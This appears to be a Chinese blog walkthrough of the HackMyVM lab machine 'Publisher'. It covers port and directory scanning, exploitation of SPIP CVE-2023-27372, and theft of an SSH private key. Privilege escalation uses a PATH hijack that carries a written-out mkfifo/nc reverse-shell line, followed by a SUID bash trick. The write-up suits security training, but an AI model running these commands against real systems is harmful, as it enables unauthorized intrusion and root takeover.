---
{"dg-publish":true,"title":"hackmyvm_Publisher","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_Publisher.md","permalink":"/安全/靶机/hackmyvm_Publisher/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 172.20.10.3
Starting arp-scan 1.10.0 with 16 hosts (https://github.com/royhills/arp-scan)
172.20.10.1     de:10:57:93:f8:64       (Unknown: locally administered)
172.20.10.4     08:00:27:8e:c3:ce       PCS Systemtechnik GmbH
172.20.10.5     2a:cd:d6:e6:08:c4       (Unknown: locally administered)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 16 hosts scanned in 1.959 seconds (8.17 hosts/sec). 3 responded

┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 172.20.10.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 07:13 EST
Nmap scan report for 172.20.10.4
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8E:C3:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds

```

+ 靶机IP：172.20.10.4
+ 端口：22,80

```sh
┌──(root㉿kali)-[~]
└─# nmap -sT -sC -sV -O -p22,80 172.20.10.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 07:15 EST
Nmap scan report for 172.20.10.4
Host is up (0.0015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
MAC Address: 08:00:27:8E:C3:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.92 seconds
```


# 初步渗透

扫一下目录：
```sh
┌──(root㉿kali)-[~]
└─# dirb http://172.20.10.4/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Feb 13 07:16:23 2025
URL_BASE: http://172.20.10.4/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.20.10.4/ ----
==> DIRECTORY: http://172.20.10.4/images/
+ http://172.20.10.4/index.html (CODE:200|SIZE:8686)
+ http://172.20.10.4/server-status (CODE:403|SIZE:276)

---- Entering directory: http://172.20.10.4/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Feb 13 07:16:50 2025
DOWNLOADED: 4612 - FOUND: 2

```
![Pasted image 20250213202018.png](/img/user/picture/Pasted%20image%2020250213202018.png)

eeee。dirb默认扫描竟然漏了信息
```sh
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://172.20.10.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://172.20.10.4/images/]
/spip                 (Status: 301) [Size: 309] [--> http://172.20.10.4/spip/]
/server-status        (Status: 403) [Size: 276]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

![Pasted image 20250213203444.png](/img/user/picture/Pasted%20image%2020250213203444.png)

![Pasted image 20250213203559.png](/img/user/picture/Pasted%20image%2020250213203559.png)

```sh
┌──(root㉿kali)-[~/workspace/pentest/Publisher]
└─# searchsploit -m php/webapps/51536.py
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/workspace/pentest/Publisher/51536.py


┌──(root㉿kali)-[~/workspace/pentest/Publisher]
└─# python3 51536.py -u http://172.20.10.4/spip/ -c id
Traceback (most recent call last):
  File "/root/workspace/pentest/Publisher/51536.py", line 63, in <module>
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'
```

emmm,这一个脚本利用报错，看了一下其他人WP，也出现了这个情况

![Pasted image 20250213210054.png](/img/user/picture/Pasted%20image%2020250213210054.png)


![Pasted image 20250213210112.png](/img/user/picture/Pasted%20image%2020250213210112.png)

```sh
meterpreter > cat user.txt
fa229046d44eda6a3598c73ad96f4ca5
```

```sh
meterpreter > cd .ssh
meterpreter > ls
Listing: /home/think/.ssh
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  569   fil   2024-01-10 07:54:17 -0500  authorized_keys
100644/rw-r--r--  2602  fil   2024-01-10 07:48:14 -0500  id_rsa
100644/rw-r--r--  569   fil   2024-01-10 07:48:14 -0500  id_rsa.pub
```

发现私钥，保存一下
![Pasted image 20250213210420.png](/img/user/picture/Pasted%20image%2020250213210420.png)
可以连接



# 提权

![Pasted image 20250213212002.png](/img/user/picture/Pasted%20image%2020250213212002.png)


有一个这个文件
`/usr/sbin/run_container`

```sh
think@publisher:/$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```


注意到这两个信息：
```txt
/bin/bash
/opt/run_container.sh
```

很有可能是执行了这个脚本

```sh
think@publisher:/$ ls -al /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh
```

而这个脚本具有修改权限

但是我们发现我们并没有权限
```sh
think@publisher:/$ cat /opt/run_container.sh
cat: /opt/run_container.sh: Permission denied
think@publisher:/$ echo "test" >> /opt/run_container.sh
bash: /opt/run_container.sh: Permission denied
```

听大佬分析原因出自shell
```sh
think@publisher:/$ echo $SHELL
/usr/sbin/ash
```
说这个shell并不是一个“完全的shell”，类似于`rbash`

所以我们要做的先是获取一个完整的shell

首先注意到执行`/opt/run_container.sh`的时候
```sh
think@publisher:/$ /opt/run_container.sh
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
See 'docker run --help'.
List of Docker containers:
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied

Enter the ID of the container or leave blank to create a new one: 1
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 5
Exiting...

```

有这么一行：
```sh
/opt/run_container.sh: line 16: validate_container_id: command not found
```
也就是尝试执行`validate_container_id`
所以我们可以尝试劫持一下

```sh
think@publisher:/tmp$ touch validate_container_id
think@publisher:/tmp$ chmod +x validate_container_id
think@publisher:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.3 8080 >/tmp/f" > validate_container_id
think@publisher:/tmp$ export PATH=/tmp:$PATH
think@publisher:/tmp$ which validate_container_id
/tmp/validate_container_id
```
具体的反弹shell内容：
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.3 8080 >/tmp/f
```


我们再去执行一下，得到shell
![Pasted image 20250213221634.png](/img/user/picture/Pasted%20image%2020250213221634.png)

```sh
$ ls -al
total 20
drwxr-xr-x  3 root root 4096 Mar 29  2024 .
drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root 1715 Mar 29  2024 run_container.sh
$ echo 'chmod +s /bin/bash' > run_container.sh
$ ls -al
total 20
drwxr-xr-x  3 root root 4096 Mar 29  2024 .
drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root   19 Feb 13 14:17 run_container.sh
```

执行SUID文件，使得bash获得SUID
```sh
$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
$ /usr/sbin/run_container
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

获得root权限：
```sh
$ /bin/bash -p
id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
cd /root
ls
root.txt
spip
cat root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```

在弄完整shell这一步可以
```sh
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```
显式调用动态链接器

```sh
think@publisher:/opt$ ls
ls: cannot open directory '.': Permission denied
think@publisher:/opt$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
think@publisher:/opt$ ls
containerd  dockerfile  run_container.sh
```


